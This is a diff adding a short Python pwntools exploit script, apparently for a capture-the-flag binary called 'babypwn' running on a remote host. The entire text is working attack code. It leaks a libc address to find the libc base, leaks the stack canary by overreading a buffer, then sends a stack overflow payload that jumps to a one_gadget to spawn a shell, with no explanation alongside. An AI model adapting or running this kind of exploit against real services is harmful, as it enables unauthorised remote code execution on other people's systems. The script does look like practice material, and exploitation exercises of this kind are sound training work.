@@ -1,0 +1,26 @@
+from pwn import *
+context(os='linux',arch='amd64',log_level='debug')
+#io=process('./babypwn')
+io=remote('172.29.14.118',9999)
+binary=ELF('./babypwn')
+libc=ELF('./libc-2.23.so')
+pause()
+buf=0x00007FFD1053A1A0
+ret=0x00007FFD1053A1C8
+
+io.recv()
+io.sendline('aeojj')
+io.recv()
+io.send('a'*8)
+io.recvuntil('a'*8)
+libc_base = u64(io.recv(6)+'\x00\x00')-libc.symbols['setvbuf']-0x144
+one_gadget=libc_base+0x45216
+print "libc_base -> " + hex(libc_base)
+print "one_gadget -> " +hex(one_gadget)
+io.recv(timeout=0.1)
+io.send('a'*25)
+io.recvuntil('a'*25)
+canary = '\x00'+io.recv(7)
+io.recv(timeout=0.1)
+io.send((ret-buf)*'a'+canary+p64(0x0)+p64(one_gadget))
+io.interactive()
